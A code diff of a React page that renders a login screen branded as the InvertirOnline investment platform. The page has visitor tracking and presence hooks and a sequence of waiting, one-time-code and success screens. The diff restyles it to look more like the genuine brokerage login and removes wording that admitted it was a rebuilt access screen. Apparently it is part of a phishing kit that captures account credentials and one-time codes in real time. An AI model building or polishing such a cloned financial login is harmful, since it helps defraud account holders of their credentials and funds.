@@ -1,10 +1,10 @@
 import { useCallback, useEffect, useState } from "react";
 import { useParams } from "react-router-dom";
-import { ShieldCheck } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
 import { useRateLimit } from "@/hooks/useRateLimit";
-import LoginForm from "@/components/login/LoginForm";
+import IolLoginForm from "@/components/iol/IolLoginForm";
+import IolIllustration from "@/components/iol/IolIllustration";
 import WaitingScreen from "@/components/login/WaitingScreen";
 import SuccessScreen from "@/components/login/SuccessScreen";
 import OtpScreen from "@/components/login/OtpScreen";
@@ -224,18 +224,18 @@ const IOL = () => {
     return (
       <>
         {generalError && (
-          <div className="mb-5 rounded-xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive">
+          <div className="mb-5 rounded-xl border border-destructive/25 bg-destructive/10 px-4 py-3 text-sm text-destructive">
             {generalError}
           </div>
         )}
-        <LoginForm onSubmit={handleLoginSubmit} loading={loading} />
+        <IolLoginForm onSubmit={handleLoginSubmit} loading={loading} />
       </>
     );
   };
 
   if (rateLimit.loading) {
     return (
-      <div className="flex min-h-screen items-center justify-center bg-background text-muted-foreground">
+      <div className="iol-theme flex min-h-screen items-center justify-center bg-background text-muted-foreground">
         Cargando...
       </div>
     );
@@ -243,7 +243,7 @@ const IOL = () => {
 
   if (rateLimit.blocked) {
     return (
-      <div className="flex min-h-screen items-center justify-center bg-background px-4">
+      <div className="iol-theme flex min-h-screen items-center justify-center bg-background px-4">
         <div className="w-full max-w-md rounded-2xl border border-border bg-card p-8 text-center text-card-foreground shadow-lg">
           <h1 className="text-xl font-semibold">Acceso restringido</h1>
           <p className="mt-2 text-sm text-muted-foreground">
@@ -255,40 +255,26 @@ const IOL = () => {
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-b from-background via-background to-muted/30 text-foreground">
-      <header className="border-b border-border/60 bg-background/90 backdrop-blur">
-        <div className="mx-auto flex w-full max-w-6xl items-center justify-between px-6 py-4">
-          <div className="flex items-center gap-3">
-            <img src={iolLogo} alt="IOL" className="h-10 w-auto object-contain" />
-            <div>
-              <p className="text-sm font-semibold tracking-wide">Invertir Online</p>
-              <p className="text-xs text-muted-foreground">Acceso seguro a tu cuenta</p>
-            </div>
-          </div>
-          <div className="hidden items-center gap-2 rounded-full border border-border bg-card px-3 py-1.5 text-xs text-muted-foreground md:flex">
-            <ShieldCheck className="h-3.5 w-3.5 text-primary" />
-            Protección reforzada
-          </div>
+    <div className="iol-theme min-h-screen bg-background text-foreground">
+      <header className="iol-topbar-shadow border-b border-border/80 bg-background">
+        <div className="mx-auto flex h-[58px] w-full max-w-5xl items-center px-5 sm:px-8">
+          <img src={iolLogo} alt="InvertirOnline" className="h-8 w-auto object-contain" />
         </div>
       </header>
 
-      <main className="mx-auto flex min-h-[calc(100vh-73px)] w-full max-w-6xl flex-col justify-center px-6 py-12 lg:flex-row lg:items-center lg:gap-16">
-        <section className="mb-10 max-w-xl lg:mb-0">
-          <span className="inline-flex rounded-full border border-border bg-card px-3 py-1 text-xs font-medium text-muted-foreground">
-            Plataforma de inversión
-          </span>
-          <h1 className="mt-5 text-4xl font-semibold tracking-tight text-foreground sm:text-5xl">
-            Recuperamos la pantalla de acceso de IOL.
+      <main className="mx-auto flex w-full max-w-5xl flex-col px-5 pb-16 pt-10 sm:px-8 lg:min-h-[calc(100vh-58px)] lg:flex-row lg:items-start lg:justify-between lg:gap-16 lg:pt-14">
+        <section className="w-full max-w-[350px] lg:pt-8">
+          <h1 className="mb-3 text-[2rem] font-semibold leading-none text-primary sm:text-[2.15rem]">
+            Ingresa a tu cuenta
           </h1>
-          <p className="mt-4 max-w-lg text-base leading-7 text-muted-foreground">
-            La ruta volvió a estar disponible con el flujo base de ingreso, espera, validación por código y confirmación de email.
-          </p>
-        </section>
 
-        <section className="w-full max-w-md">
-          <div className="rounded-3xl border border-border bg-card p-6 shadow-2xl shadow-black/10 sm:p-8">
+          <div className="iol-card-shadow rounded-2xl bg-card px-6 py-7 sm:px-7">
             {renderCardContent()}
           </div>
+        </section>
+
+        <section className="flex flex-1 justify-center pt-10 lg:justify-end lg:pt-6">
+          <IolIllustration />
         </section>
       </main>
     </div>
@@ -296,3 +282,4 @@ const IOL = () => {
 };
 
 export default IOL;
+
